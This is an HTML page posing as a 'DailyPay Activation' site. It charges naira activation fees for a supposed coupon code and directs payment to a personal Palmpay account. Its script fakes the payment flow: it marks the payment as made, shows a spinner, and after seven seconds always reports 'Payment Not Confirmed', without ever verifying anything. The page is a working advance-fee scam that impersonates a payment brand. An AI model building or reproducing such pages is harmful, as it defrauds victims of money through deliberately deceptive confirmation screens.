<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>DailyPay Activation</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #ffffff; /* Default background for the body */
    }

    /* Styles for the First Page (Activation Screen) */
    #firstPage {
      background-color: #a3d6a2;
      text-align: center;
      padding: 100px 20px;
      border-bottom-left-radius: 60px;
      min-height: 100vh; /* Ensure it takes full height */
      box-sizing: border-box; /* Include padding in height calculation */
      display: flex; /* Use flexbox for vertical centering if needed */
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }

    #firstPage h1 {
      margin: 0;
      font-size: 28px;
      font-weight: bold;
      color: #000;
      text-shadow: 1px 1px 1px #444;
    }

    #firstPage .logo {
      font-size: 40px;
      font-weight: bold;
      margin: 20px 0;
    }

    #firstPage .logo span:first-child {
      color: #1e1c3f;
    }

    #firstPage .logo span:last-child {
      color: #4c8052;
    }

    #firstPage .activation-text {
      font-size: 24px;
      font-weight: bold;
      margin: 30px 0 10px;
      text-shadow: 1px 1px 1px #444;
    }

    #firstPage .confetti {
      font-size: 40px;
      color: #5cb85c;
      margin-bottom: 40px;
    }

    #firstPage .button {
      background-color: white;
      border: 2px solid #ccc;
      padding: 15px 30px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      box-shadow: 2px 2px 2px #444;
      text-decoration: none; /* Remove underline for link */
      color: black; /* Text color for the button */
      display: inline-block; /* Allows padding and alignment */
      transition: background-color 0.3s ease;
    }

    #firstPage .button:hover {
        background-color: #f0f0f0;
    }

    #firstPage .bottom-bar {
      height: 6px;
      width: 60%;
      background-color: #1a4f1a;
      margin: 40px auto 0;
      border-radius: 3px;
    }

    /* Styles for the Second Page (Payment/Form Screen) */
    #secondPage {
        font-family: sans-serif;
        background-color: #1a237e;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        flex-direction: column;
        display: none; /* Hidden by default */
        padding-top: 30px; /* Space for the fixed top bar */
        box-sizing: border-box;
    }

    .container, .payment-info, .loading-screen, .payment-confirmation-wrapper, .payment-not-confirmed {
      background-color: white;
      border-radius: 20px 20px 0 0;
      padding: 30px;
      width: 90%;
      max-width: 400px;
      display: none; /* Controlled by JS */
      text-align: center;
    }

    #secondPage h1 {
      color: white;
      margin: 0;
      padding: 20px;
      border-radius: 20px 20px 0 0;
      background-color: #1a237e;
      text-align: left;
      font-size: 24px;
      width: 100%; /* Ensure heading covers full width within container */
      box-sizing: border-box;
    }

    .form-group {
      margin-bottom: 20px;
      text-align: left;
    }

    label {
      display: block;
      margin-bottom: 5px;
      color: #333;
      font-weight: bold;
    }

    select, input[type="text"], input[type="email"] {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
      box-sizing: border-box;
      font-size: 16px;
      color: #555;
      background-color: white;
    }

    select {
      appearance: none;
      -webkit-appearance: none;
      -moz-appearance: none;
      background-image: url('data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http://www.w3.org/2000/svg%22%20viewBox%3D%220%200%20256%20256%22%3E%3Cpath%20fill%3D%22%23333%22%20d%3D%22M128%20192L0%2064h256z%22/%3E%3C/svg%3E');
      background-repeat: no-repeat;
      background-position: right 10px center;
      background-size: 12px;
      padding-right: 30px;
    }

    input[readonly] {
      background-color: #f0f0f0;
      cursor: not-allowed;
    }

    .second-page-button { /* Differentiated class from first page button */
      background-color: #1a237e;
      color: white;
      padding: 15px 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 18px;
      width: 100%;
      transition: background-color 0.3s ease;
    }

    .second-page-button:hover {
      background-color: #0d1449;
    }

    .note {
      font-size: 16px;
      margin-bottom: 20px;
      text-align: center;
    }

    .box {
      border: 2px solid #ccc;
      padding: 20px;
      background-color: #f5f3f3;
    }

    .info-group {
      margin-bottom: 15px;
      text-align: left;
    }

    .info-group span {
      font-weight: bold;
      display: block;
      margin-top: 5px;
    }

    .copy-btn {
      float: right;
      background-color: orange;
      color: white;
      padding: 4px 10px;
      border: none;
      cursor: pointer;
      font-weight: bold;
      border-radius: 3px;
    }

    .bottom-section {
      border-top: 1px solid #999;
      padding-top: 20px;
      margin-top: 20px;
    }

    .transfer-btn {
      background-color: orange;
      color: #0044aa;
      font-weight: 600;
      padding: 15px;
      border: none;
      margin-top: 15px;
      width: 100%;
      font-size: 16px;
      cursor: pointer;
      border-radius: 5px;
      transition: background-color 0.3s ease;
    }

    .transfer-btn:hover {
        background-color: #e08000;
    }

    /* Loading screen styles */
    .spinner {
      border: 6px solid #eee;
      border-top: 6px solid #1a237e;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      margin: 20px auto;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Payment Confirmation Screen styles */
    .payment-confirmation-wrapper {
      padding: 0;
      border-radius: 20px;
      overflow: hidden;
      margin-top: 30px;
    }

    .payment-confirmation-wrapper .header {
      background-color: #fff;
      padding: 15px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-bottom: 1px solid #eee;
    }

    .payment-confirmation-wrapper .header .bank-transfer-text {
      color: #333;
      font-weight: bold;
      font-size: 18px;
    }

    .payment-confirmation-wrapper .header .cancel-btn {
      color: #e57373;
      font-size: 14px;
      cursor: pointer;
    }

    .payment-confirmation-wrapper .content {
      background-color: #fff;
      padding: 20px 30px;
      text-align: center;
    }

    .payment-confirmation-wrapper .amount-section {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
    }

    .payment-confirmation-wrapper .amount-section .logo {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      background-color: #e0e0e0;
      margin-right: 15px;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .payment-confirmation-wrapper .amount-section .logo img {
        width: 100%;
        height: 100%;
        object-fit: contain;
        border-radius: 50%;
    }


    .payment-confirmation-wrapper .amount-section .amount {
      font-size: 24px;
      font-weight: bold;
      color: #333;
    }

    .payment-confirmation-wrapper .amount-section .email {
      font-size: 14px;
      color: #777;
    }

    .payment-confirmation-wrapper .instruction {
      font-size: 18px;
      color: #333;
      margin-bottom: 30px;
      line-height: 1.5;
    }

    .payment-confirmation-wrapper .loader-spinner {
      border: 4px solid #f3f3f3;
      border-top: 4px solid orange;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }

    .payment-confirmation-wrapper .wait-text {
      font-size: 16px;
      color: #555;
      margin-top: 10px;
      margin-bottom: 30px;
    }

    .payment-confirmation-wrapper .status-box {
      display: flex;
      align-items: center;
      justify-content: space-between;
      background-color: #f8f8f8;
      border: 1px solid #ddd;
      border-radius: 8px;
      padding: 15px 20px;
      margin-bottom: 15px;
    }

    .payment-confirmation-wrapper .status-box.completed {
        background-color: #e6ffe6;
        border-color: #a3e6a3;
    }

    .payment-confirmation-wrapper .status-box .status-text {
      font-size: 16px;
      color: #333;
    }

    .payment-confirmation-wrapper .status-box .icon {
      width: 24px;
      height: 24px;
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      font-weight: bold;
    }

    .payment-confirmation-wrapper .status-box .icon.checked {
      background-color: #4CAF50;
      color: white;
    }

     .payment-confirmation-wrapper .status-box .icon.loading {
      background-color: transparent;
    }

    /* Payment Not Confirmed Screen styles */
    .payment-not-confirmed {
        padding: 30px;
        border-radius: 20px;
        margin-top: 30px;
        background-color: #fff;
    }
    .payment-not-confirmed h2 {
        color: #d32f2f;
        font-size: 24px;
        margin-bottom: 20px;
    }
    .payment-not-confirmed p {
        color: #555;
        font-size: 16px;
        margin-bottom: 25px;
    }
    .payment-not-confirmed .contact-info {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
        margin-top: 20px;
        font-size: 16px;
    }
    .payment-not-confirmed .contact-info img {
        width: 24px;
        height: 24px;
    }
    .payment-not-confirmed .contact-info a {
        color: #1a237e;
        text-decoration: none;
        font-weight: bold;
    }
    .payment-not-confirmed .contact-info a:hover {
        text-decoration: underline;
    }

    .top-bar-placeholder {
        background-color: black;
        width: 100%;
        height: 30px;
        position: fixed;
        top: 0;
        left: 0;
        z-index: 1000;
    }

    .message-display {
      background-color: #e3f2fd;
      color: #1a237e;
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 20px;
      font-size: 16px;
      font-weight: bold;
      text-align: center;
      display: none;
    }

    /* New styles for Activation Explanation */
    #activationExplanationOverlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.7);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 1001;
        display: none; /* Hidden by default */
    }

    #activationExplanationBox {
        background-color: white;
        padding: 30px;
        border-radius: 15px;
        max-width: 500px;
        text-align: left;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }

    #activationExplanationBox h2 {
        color: #1e1c3f;
        margin-top: 0;
        margin-bottom: 15px;
        font-size: 24px;
    }

    #activationExplanationBox p {
        color: #333;
        font-size: 16px;
        line-height: 1.6;
        margin-bottom: 10px;
    }

    #activationExplanationBox ul {
        list-style: none;
        padding: 0;
        margin-bottom: 20px;
    }

    #activationExplanationBox ul li {
        margin-bottom: 8px;
        color: #555;
        font-size: 15px;
    }

    #activationExplanationBox .understand-button {
        background-color: #1a237e;
        color: white;
        padding: 12px 25px;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        font-size: 18px;
        font-weight: bold;
        display: block;
        width: 100%;
        margin-top: 20px;
        transition: background-color 0.3s ease;
    }

    #activationExplanationBox .understand-button:hover {
        background-color: #0d1449;
    }

    /* Loading spinner for initial "Activate my code" click */
    #initialLoadingOverlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(255, 255, 255, 0.9);
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        z-index: 1002; /* Higher z-index to appear on top */
        display: none; /* Hidden by default */
    }

    #initialLoadingOverlay p {
        margin-top: 20px;
        font-size: 20px;
        color: #1a237e;
        font-weight: bold;
    }

  </style>
</head>
<body>

  <div id="firstPage">
    <h1>Welcome to</h1>
    <div class="logo">
      <span>daily</span><span>pay</span>
    </div>
    <div class="activation-text">Activation</div>
    <div class="confetti"></div>
    <a href="#" class="button" onclick="handleActivateClick(event)">Activate my code</a>
    <div class="bottom-bar"></div>
  </div>

  <div id="initialLoadingOverlay">
      <div class="spinner"></div>
      <p>Loading activation details...</p>
  </div>

  <div id="activationExplanationOverlay">
      <div id="activationExplanationBox">
          <h2>Activation Explanation:</h2>
          <p>When you activate your coupon code, it will show you when the code will expire and give you an activation code. This activation code is what you’ll use to make withdrawals.</p>
          <p>You can choose how long you want the code to stay active. The activation fee depends on the duration you select:</p>
          <ul>
              <li><strong>1 week activation</strong> costs ₦14,500</li>
              <li><strong>2 weeks activation</strong> costs ₦29,000</li>
              <li><strong>1 month activation</strong> costs ₦50,000</li>
          </ul>
          <p>Once activated, you’ll be able to withdraw at any time before the code expires, based on the duration you selected.</p>
          <button class="understand-button" onclick="hideActivationExplanation()">I Understand</button>
      </div>
  </div>

  <div id="secondPage">
    <div class="top-bar-placeholder"></div>

    <div class="container" id="formSection">
      <div class="message-display" id="couponMessage"></div>
      <h1></h1>
      <div class="form-group">
        <label for="amountSelector">Select Amount</label>
        <select id="amountSelector">
          <option value="14500">₦14,500</option>
          <option value="29000">₦29,000</option>
          <option value="50000">₦50,000</option>
        </select>
      </div>
      <div class="form-group">
        <label for="fullName">Enter your coupon code</label>
        <input type="text" id="fullName" placeholder="Your coupon code">
      </div>
      <div class="form-group">
        <label for="email">Your Email Address</label>
        <input type="email" id="email" placeholder="email address">
      </div>
      <button class="second-page-button" onclick="goToLoading()">Pay</button>
    </div>

    <div class="loading-screen" id="loadingScreen">
      <h2>Processing Payment...</h2>
      <div class="spinner"></div>
      <p>Please wait while we prepare your payment instructions.</p>
    </div>

    <div class="payment-info" id="paymentSection">
      <div class="note">Please note: we do not accept any payment from Opay bank</div>
      <div class="box">
        <div class="info-group">
          Amount
          <span id="displayAmountPaymentInfo">NGN 6,000 <button class="copy-btn" onclick="copyText(document.getElementById('displayAmountPaymentInfo').dataset.rawAmount)">Copy</button></span>
        </div>
        <div class="info-group">
          Account Number
          <span style="color: blue;">9049242069 <button class="copy-btn" onclick="copyText('9049242069')">Copy</button></span>
        </div>
        <div class="info-group">
          Bank Name
          <span>Palmpay</span>
        </div>
        <div class="info-group">
          Account Name
          <span>Victory Nnamdi</span>
        </div>
        <div class="bottom-section">
          <p>Pay to this specific account and get your coupon code</p>
          <button class="transfer-btn" onclick="showPaymentConfirmation()">I have made this bank Transfer</button>
        </div>
      </div>
    </div>

    <div class="payment-confirmation-wrapper" id="paymentConfirmationSection">
      <div class="header">
        <span class="bank-transfer-text">Bank Transfer</span>
        <span class="cancel-btn">Cancel</span>
      </div>
      <div class="content">
        <div class="amount-section">
          <div class="logo">
              <img src="https://via.placeholder.com/40/000000/FFFFFF?text=Logo" alt="Logo">
          </div>
          <div class="amount-details">
            <div class="amount" id="displayAmountConfirmation">NGN 6,000</div>
            <div class="email" id="userEmailConfirm"></div> </div>
        </div>
        <p class="instruction">Proceed to your bank app to complete this Transfer</p>
        <div class="loader-spinner"></div>
        <p class="wait-text">Wait while we confirm your payment...</p>

        <div class="status-box completed">
          <span class="status-text">Payment Made</span>
          <span class="icon checked">&#10003;</span>
        </div>
        <div class="status-box" id="confirmingPaymentBox">
          <span class="status-text">Confirming Payment</span>
          <span class="icon loading"><div class="loader-spinner" style="width:20px; height:20px; margin:0; border-width: 3px; border-top-color: orange;"></div></span>
        </div>
      </div>
    </div>

    <div class="payment-not-confirmed" id="paymentNotConfirmedSection">
      <h2>Payment Not Confirmed</h2>
      <p>We couldn't confirm your payment at this time. Please ensure you have completed the bank transfer correctly.</p>
      <p>If you need help, contact us here:</p>
      <div class="contact-info">
          <img src="https://img.icons8.com/ios-filled/50/000000/filled-message.png" alt="Email Icon" />
          <a href="mailto:support@dailypay.com">support@dailypay.com</a>
      </div>
    </div>
  </div>


  <script>
    let paymentConfirmationTimer;
    let selectedAmount = 0;

    // Function to format numbers as currency (e.g., 14500 -> ₦14,500)
    function formatAsNaira(amount) {
        return `₦${Number(amount).toLocaleString('en-US')}`;
    }

    document.addEventListener('DOMContentLoaded', function() {
        const amountSelector = document.getElementById('amountSelector');
        const couponMessageDiv = document.getElementById('couponMessage');

        // Set initial selected amount to the first option's value
        selectedAmount = parseInt(amountSelector.value);
        updateCouponMessage(selectedAmount);

        // Update the amount and message when the dropdown value changes
        amountSelector.addEventListener('change', function() {
            selectedAmount = parseInt(this.value);
            console.log("Selected amount:", selectedAmount);
            updateCouponMessage(selectedAmount);
        });

        // Initially hide the second page content
        document.getElementById('secondPage').style.display = 'none';
        document.getElementById('formSection').style.display = 'block'; // Make sure the form is shown on the second page init
    });

    // Function to handle the "Activate my code" button click
    function handleActivateClick(event) {
        event.preventDefault();
        document.getElementById('initialLoadingOverlay').style.display = 'flex'; // Show loading screen

        setTimeout(() => {
            document.getElementById('initialLoadingOverlay').style.display = 'none'; // Hide loading screen
            document.getElementById('activationExplanationOverlay').style.display = 'flex'; // Show explanation
        }, 2000); // Simulate a 2-second loading time
    }

    // Function to hide the activation explanation and show the second page
    function hideActivationExplanation() {
        document.getElementById('activationExplanationOverlay').style.display = 'none';
        document.getElementById('firstPage').style.display = 'none'; // Ensure first page is hidden
        document.getElementById('secondPage').style.display = 'flex'; // Show the second page
        document.body.style.backgroundColor = '#1a237e'; // Change body background for the second page
    }


    function updateCouponMessage(amount) {
        const couponMessageDiv = document.getElementById('couponMessage');
        let message = "";

        if (amount === 14500) {
            message = "You selected ₦14,500. Your coupon code will be valid for one week after activation.";
        } else if (amount === 29000) {
            message = "You selected ₦29,000. Your coupon code will be valid for 2 weeks after activation.";
        } else if (amount === 50000) {
            message = "You selected ₦50,000. Your coupon code will be valid for one month after activation.";
        }

        if (message) {
            couponMessageDiv.innerText = message;
            couponMessageDiv.style.display = 'block';
        } else {
            couponMessageDiv.style.display = 'none';
        }
    }

    function goToLoading() {
      const couponCode = document.getElementById('fullName').value.trim();
      const email = document.getElementById('email').value.trim();

      if (!couponCode || !email) {
        alert('Please enter your coupon code and email address.');
        return;
      }

      document.getElementById('userEmailConfirm').innerText = email;

      const displayAmountPaymentInfo = document.getElementById('displayAmountPaymentInfo');
      displayAmountPaymentInfo.innerHTML = `${formatAsNaira(selectedAmount)} <button class="copy-btn" onclick="copyText(this.parentNode.dataset.rawAmount)">Copy</button>`;
      displayAmountPaymentInfo.dataset.rawAmount = selectedAmount;

      document.getElementById('displayAmountConfirmation').innerText = formatAsNaira(selectedAmount);

      document.getElementById('formSection').style.display = 'none';
      document.getElementById('loadingScreen').style.display = 'block';

      setTimeout(() => {
        document.getElementById('loadingScreen').style.display = 'none';
        document.getElementById('paymentSection').style.display = 'block';
      }, 3000);
    }

    function copyText(text) {
      navigator.clipboard.writeText(text).then(() => {
        alert("Copied: " + text);
      }).catch(err => {
        console.error('Failed to copy text: ', err);
        alert('Failed to copy text. Please copy manually.');
      });
    }

    function showPaymentConfirmation() {
        document.getElementById('paymentSection').style.display = 'none';
        document.getElementById('paymentConfirmationSection').style.display = 'block';

        paymentConfirmationTimer = setTimeout(() => {
            document.getElementById('paymentConfirmationSection').style.display = 'none';
            document.getElementById('paymentNotConfirmedSection').style.display = 'block';
        }, 7000);
    }
  </script>

</body>
</html>
